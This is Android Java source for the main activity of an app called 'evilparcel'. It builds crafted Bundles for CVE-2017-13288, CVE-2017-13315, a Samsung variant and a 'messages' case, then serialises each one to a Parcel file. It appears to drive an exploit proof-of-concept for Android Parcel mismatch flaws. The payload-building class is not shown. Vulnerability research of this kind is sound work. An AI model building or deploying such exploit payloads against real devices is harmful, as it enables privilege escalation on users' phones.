package com.example.evilparcel;

import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Bundle;
import android.os.Environment;
import android.os.Parcel;
import android.os.Parcelable;
import android.util.Log;

import java.io.File;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.IOException;

public class MainActivity extends AppCompatActivity {

    public static final String TAG = "evilparcel";

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        Bundle evil=new Bundle();
        Intent intent = null;
        evil = new MakeBundle().makeBundleForSamsangSinceP(intent);
        writeFile("samsang.pcl",evil);
        evil = new MakeBundle().makeCVE_2017_13288(intent);
        writeFile("CVE_2017_13288.pcl",evil);
        evil = new MakeBundle().makeCVE_2017_13315(intent);
        writeFile("CVE_2017_13315.pcl",evil);
        evil = new MakeBundle().makeMessages(intent);
        writeFile("mess.pcl",evil);
    }
    public void writeFile(String filename,Bundle evil){
        try {
            FileOutputStream fos;
            Parcel Data=Parcel.obtain();
            evil.writeToParcel(Data,0);
            byte[] raw = Data.marshall();//序列化
            fos  = openFileOutput(filename, Context.MODE_PRIVATE);//file path /data/data/com.example/evilparcel/files/
            fos.write(raw);
            fos.close();
        } catch (FileNotFoundException e){
            e.printStackTrace();
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
}